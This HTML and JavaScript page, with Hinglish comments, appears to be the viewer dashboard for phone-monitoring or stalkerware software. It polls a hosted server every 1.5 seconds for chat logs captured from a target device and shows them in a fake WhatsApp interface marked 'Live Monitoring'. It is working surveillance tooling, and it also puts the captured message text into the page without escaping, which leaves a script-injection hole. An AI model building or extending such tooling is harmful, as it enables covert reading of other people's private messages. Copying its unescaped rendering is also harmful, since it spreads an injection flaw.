<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WhatsApp Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- WHATSAPP DARK THEME CSS --- */
        body { 
            margin: 0; 
            background-color: #111b21; 
            font-family: Helvetica, Arial, sans-serif; 
            color: #e9edef; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #111b21;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: CONTACT LIST STYLE --- */
        #contactListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
        
        .main-header {
            padding: 15px; display: flex; align-items: center; gap: 15px;
            background-color: #202c33; border-bottom: 1px solid #2a3942; z-index: 5;
        }
        
        /* New Back Button Style */
        .header-back-btn { font-size: 1.2rem; color: #aebac1; cursor: pointer; }
        .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; flex: 1; }
        .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }

        .contact-list { flex: 1; overflow-y: auto; }
        
        .contact-item {
            display: flex; align-items: center; padding: 12px 15px; cursor: pointer;
            transition: 0.2s;
        }
        .contact-item:active { background: #202c33; }
        
        .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; overflow: hidden; color: #fff; font-size: 1.2rem; }
        .dp-circle img { width: 100%; height: 100%; object-fit: cover; }
        
        .contact-info { flex: 1; border-bottom: 1px solid #202c33; padding-bottom: 12px; }
        .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .name { font-size: 1rem; font-weight: 500; color: #e9edef; }
        .time { font-size: 0.75rem; color: #8696a0; }
        .last-msg { font-size: 0.85rem; color: #8696a0; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }

        /* --- VIEW 2: CHAT CONVERSATION STYLE (Hidden Initially) --- */
        #chatDetailView { 
            display: none; 
            flex-direction: column; height: 100%; 
            position: absolute; top: 0; left: 0; width: 100%; background: #0b141a; z-index: 10;
        }

        .chat-header {
            background-color: #202c33; padding: 10px 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #2a3942;
        }
        .back-arrow { font-size: 1.2rem; color: #aebac1; padding: 8px; cursor: pointer; border-radius: 50%; }
        
        .chat-area {
            flex: 1; padding: 15px; overflow-y: auto;
            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
            background-size: 400px; background-color: #0b141a; 
        }

        .message { max-width: 75%; margin-bottom: 8px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; clear: both; line-height: 1.3; word-wrap: break-word;}
        
        /* Incoming look for captured text */
        .msg-left { background-color: #202c33; float: left; border-top-left-radius: 0; }
        
        .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; display: flex; align-items: center; gap: 3px; }

        .chat-footer { background-color: #202c33; padding: 8px 10px; display: flex; align-items: center; gap: 10px; }
        .fake-input { flex: 1; background: #2a3942; padding: 10px 15px; border-radius: 20px; color: #8696a0; font-size: 0.95rem; }

        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #374045; border-radius: 2px; }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="contactListView">
            <div class="main-header">
                <i class="fa-solid fa-arrow-left header-back-btn" onclick="goBackToDashboard()"></i>
                <span class="app-title">WhatsApp</span>
                <div class="top-icons">
                    <i class="fa-solid fa-camera"></i>
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <i class="fa-solid fa-ellipsis-vertical"></i>
                </div>
            </div>
            
            <div class="contact-list" id="contactsContainer">
                <p style="text-align: center; margin-top: 20px; color: #8696a0;">Loading chats...</p>
            </div>
        </div>

        <div id="chatDetailView">
            <div class="chat-header">
                <i class="fa-solid fa-arrow-left back-arrow" onclick="closeChat()"></i>
                <div class="dp-circle" style="width: 35px; height: 35px; margin-right: 10px;">
                    <i class="fa-solid fa-user"></i>
                </div>
                <div style="flex: 1;">
                    <h3 id="headerName" style="margin:0; font-size: 1rem; font-weight: 500;">User</h3>
                    <p id="statusText" style="margin:0; font-size: 0.75rem; color: #aebac1;">Live Monitoring</p>
                </div>
                <i class="fa-solid fa-video" style="color: #aebac1; margin-right: 20px;"></i>
                <i class="fa-solid fa-phone" style="color: #aebac1; margin-right: 15px;"></i>
                <i class="fa-solid fa-ellipsis-vertical" style="color: #aebac1;"></i>
            </div>

            <div class="chat-area" id="messagesContainer">
            </div>

            <div class="chat-footer">
                <i class="fa-solid fa-plus" style="color: #8696a0; font-size: 1.2rem;"></i>
                <div class="fake-input">Read Only Mode</div>
                <i class="fa-solid fa-microphone" style="color: #8696a0; font-size: 1.2rem;"></i>
            </div>
        </div>

    </div>

    <script>
        // --- CONFIGURATION ---
        const SERVER_URL = "https://child-v9no.onrender.com"; // Tumhara Render URL
        const DEVICE_ID = localStorage.getItem('monitoring_id');

        // Agar ID nahi mili to wapas dashboard bhejo
        if (!DEVICE_ID) {
            alert("Device ID missing!");
            window.location.href = 'index.html';
        }

        // --- VARIABLES ---
        let rawLogs = [];
        let groupedChats = {}; 
        let currentOpenChatApp = null; // Currently kaunsa chat khula hai
        let refreshInterval = null;

        // --- DOM ELEMENTS ---
        const contactListDiv = document.getElementById('contactsContainer');
        const chatViewDiv = document.getElementById('chatDetailView');
        const listViewDiv = document.getElementById('contactListView');
        const msgsDiv = document.getElementById('messagesContainer');
        const headerName = document.getElementById('headerName');

        // --- 1. FETCH DATA FROM SERVER ---
        async function fetchChats() {
            try {
                // Server se chat_logs mangwana
                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/chat_logs`);
                const data = await response.json();

                if (Array.isArray(data)) {
                    rawLogs = data; // Data aa gaya
                    processLogs();  // Data ko process karo
                    updateUI();     // Screen update karo
                }
            } catch (error) {
                console.error("Error fetching chats:", error);
            }
        }

        // --- 2. PROCESS DATA (Group by App Name) ---
        function processLogs() {
            groupedChats = {};

            // Logs latest pehle aate hain, hum unhe iterate karte hain
            rawLogs.forEach(log => {
                const appName = log.app || "Unknown";
                
                // Agar list me ye app nahi hai to banao
                if (!groupedChats[appName]) {
                    groupedChats[appName] = {
                        name: appName,
                        lastMsg: log.text,
                        time: new Date(log.time || Date.now()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                        messages: []
                    };
                }

                // Message add karo
                groupedChats[appName].messages.push({
                    text: log.text,
                    time: new Date(log.time || Date.now()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
                });
            });
        }

        // --- 3. UPDATE UI (List & Detail) ---
        function updateUI() {
            // A. Update List View
            contactListDiv.innerHTML = "";
            const apps = Object.keys(groupedChats);

            if (apps.length === 0) {
                contactListDiv.innerHTML = "<p style='text-align:center; padding:20px; color:#888'>No data received yet.</p>";
            } else {
                apps.forEach(app => {
                    const chat = groupedChats[app];
                    contactListDiv.innerHTML += `
                        <div class="contact-item" onclick="openChat('${app}')">
                            <div class="dp-circle"><i class="fa-solid fa-user"></i></div>
                            <div class="contact-info">
                                <div class="row-top">
                                    <span class="name">${chat.name}</span>
                                    <span class="time">${chat.time}</span>
                                </div>
                                <div class="last-msg">${chat.lastMsg}</div>
                            </div>
                        </div>
                    `;
                });
            }

            // B. Update Open Chat (Agar koi khula hai to live update)
            if (currentOpenChatApp && groupedChats[currentOpenChatApp]) {
                renderMessages(groupedChats[currentOpenChatApp].messages);
            }
        }

        // --- 4. CHAT OPEN/CLOSE LOGIC ---
        
        function openChat(appName) {
            currentOpenChatApp = appName;
            headerName.innerText = appName;
            
            // Messages dikhao
            if (groupedChats[appName]) {
                renderMessages(groupedChats[appName].messages);
            }

            // View switch
            listViewDiv.style.display = 'none';
            chatViewDiv.style.display = 'flex';
        }

        function renderMessages(msgs) {
            // Note: Server 'Latest First' bhejta hai, Chat me 'Oldest First' dikhana hota hai
            // Isliye hum array ko reverse karenge display ke liye
            const sortedMsgs = [...msgs].reverse(); 

            msgsDiv.innerHTML = "";
            sortedMsgs.forEach(msg => {
                msgsDiv.innerHTML += `
                    <div class="message msg-left">
                        ${msg.text}
                        <span class="msg-time">${msg.time}</span>
                    </div>
                `;
            });
            
            // Auto scroll to bottom
            msgsDiv.scrollTop = msgsDiv.scrollHeight;
        }

        function closeChat() {
            currentOpenChatApp = null;
            chatViewDiv.style.display = 'none';
            listViewDiv.style.display = 'flex';
        }

        // Back to Main Dashboard
        function goBackToDashboard() {
            window.location.href = 'index.html'; // Yahan apne dashboard file ka naam check karlena
        }

        // --- 5. INITIALIZATION ---
        
        // Pehli baar load karo
        fetchChats();

        // 1.5 Second ka Loop (Auto Refresh)
        refreshInterval = setInterval(fetchChats, 1500);

    </script>
</body>
</html>
